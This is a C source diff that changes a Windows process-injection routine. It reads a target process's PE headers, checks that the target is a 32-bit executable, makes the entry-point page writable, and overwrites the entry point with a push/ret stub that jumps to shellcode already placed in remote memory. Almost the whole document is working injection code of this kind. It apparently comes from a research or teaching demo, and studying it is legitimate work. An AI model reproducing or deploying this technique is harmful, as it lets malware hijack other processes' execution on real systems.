@@ -4,19 +4,6 @@
 
 #define PAGE_SIZE 0x1000
 
-void hex_dump(unsigned char *buf, size_t buf_size)
-{
-    size_t pad = 8;
-    size_t col = 16;
-    putchar('\n');
-    for (size_t i = 0; i < buf_size; i++) {
-        if (i != 0 && i % pad == 0) putchar('\t');
-        if (i != 0 && i % col == 0) putchar('\n');
-        printf("%02X ", buf[i]);
-    }
-    putchar('\n');
-}
-
 IMAGE_NT_HEADERS* get_nt_hrds(BYTE *read_proc)
 {
     IMAGE_DOS_HEADER *idh = NULL;
@@ -27,7 +14,27 @@ IMAGE_NT_HEADERS* get_nt_hrds(BYTE *read_proc)
     return inh;
 }
 
-bool paste_shellcode_at_ep(HANDLE hProcess, LPBYTE shellcode, DWORD shellcodeSize)
+bool is_target_injectable(BYTE* hdrs_buf)
+{
+    if (hdrs_buf == NULL) return false;
+
+    // verify read content:
+    if (hdrs_buf[0] != 'M' || hdrs_buf[1] != 'Z') {
+        printf("[-] MZ header check failed\n");
+        return false;
+    }
+    //check if supported type
+    IMAGE_NT_HEADERS *inh = get_nt_hrds(hdrs_buf);
+    if (inh == NULL) return false;
+
+    if (inh->FileHeader.Machine != IMAGE_FILE_MACHINE_I386) {
+        printf("[WARNING] Not supported type! This example contains 32 bit shellcode and supports only injections to 32bit executables\n");
+        return false;
+    }
+    return true;
+}
+
+bool paste_shellcode_at_ep(HANDLE hProcess, LPVOID remote_shellcode_ptr)
 {
     PROCESS_BASIC_INFORMATION pbi;
     memset(&pbi, 0, sizeof(PROCESS_BASIC_INFORMATION));
@@ -59,36 +66,18 @@ bool paste_shellcode_at_ep(HANDLE hProcess, LPBYTE shellcode, DWORD shellcodeSiz
         printf("[-] ReadProcessMemory failed\n");
         return false;
     }
-    // verify read content:
-    if (hdrs_buf[0] != 'M' || hdrs_buf[1] != 'Z') {
-        printf("[-] MZ header check failed\n");
-        return false;
-    }
-    //check if supported type
-    IMAGE_NT_HEADERS *inh = get_nt_hrds(hdrs_buf);
-    if (inh == NULL) return false;
-
-    if (inh->FileHeader.Machine != IMAGE_FILE_MACHINE_I386) {
-        printf("[WARNING] Not supported type! This example contains 32 bit shellcode and supports only injections to 32bit executables\n");
+    if (!is_target_injectable(hdrs_buf)) {
+        printf("[-] Cannot inject in this target!\n");
         return false;
     }
 
     // fetch Entry Point From headers
+    IMAGE_NT_HEADERS *inh = get_nt_hrds(hdrs_buf);
+    if (inh == NULL) return false;
+
     IMAGE_OPTIONAL_HEADER32 opt_hdr = inh->OptionalHeader;
     DWORD ep_rva = opt_hdr.AddressOfEntryPoint;
     printf("EP = 0x%x\n", ep_rva);
-
-    //read code at OEP (this is just a test)
-    unsigned char oep_buf[0x30];
-    if (!ReadProcessMemory(hProcess, (LPBYTE)ImageBase + ep_rva, oep_buf, sizeof(oep_buf), &read_bytes) && read_bytes != sizeof(oep_buf))
-    {
-        printf("[-] ReadProcessMemory failed\n");
-        return false;
-    }
-
-    printf("OEP dump:\n");
-    hex_dump(oep_buf, sizeof(oep_buf));
-    putchar('\n');
 
     //make a memory page containing Entry Point Writable:
     DWORD oldProtect;
@@ -97,10 +86,33 @@ bool paste_shellcode_at_ep(HANDLE hProcess, LPBYTE shellcode, DWORD shellcodeSiz
         return false;
     }
 
-    // paste the shellcode at Entry Point:
-    if (!WriteProcessMemory(hProcess, (LPBYTE)ImageBase + ep_rva, shellcode, shellcodeSize, &read_bytes))
+    BYTE hook_buffer[0x10];
+    memset(hook_buffer, 0xcc,sizeof(hook_buffer));
+
+    printf("Entry Point v: %p\n", ep_rva);
+    printf("shellcode ptr: %p\n", remote_shellcode_ptr);
+
+    //prepare the redirection:
+    //address of the shellcode will be pushed on the stack and called via ret
+    hook_buffer[0] = 0x68; //push
+    hook_buffer[5] = 0xC3; //ret
+    
+    //for 32bit code:
+    DWORD shellcode_addr = (DWORD)remote_shellcode_ptr;
+    memcpy(hook_buffer + 1, &shellcode_addr, sizeof(shellcode_addr));
+
+    //paste the redirection at Entry Point:
+    SIZE_T writen_bytes = 0;
+    if (!WriteProcessMemory(hProcess, (LPBYTE)ImageBase + ep_rva, hook_buffer, sizeof(hook_buffer) , &writen_bytes))
     {
         printf("[-] WriteProcessMemory failed, err = %d\n", GetLastError());
+        return false;
+    }
+
+    //restore the previous access rights at entry point:
+    DWORD oldProtect2;
+    if (!VirtualProtectEx(hProcess, (BYTE*)ImageBase + ep_rva, PAGE_SIZE, oldProtect, &oldProtect2)) {
+        printf("Virtual Protect Failed!\n");
         return false;
     }
     return true;
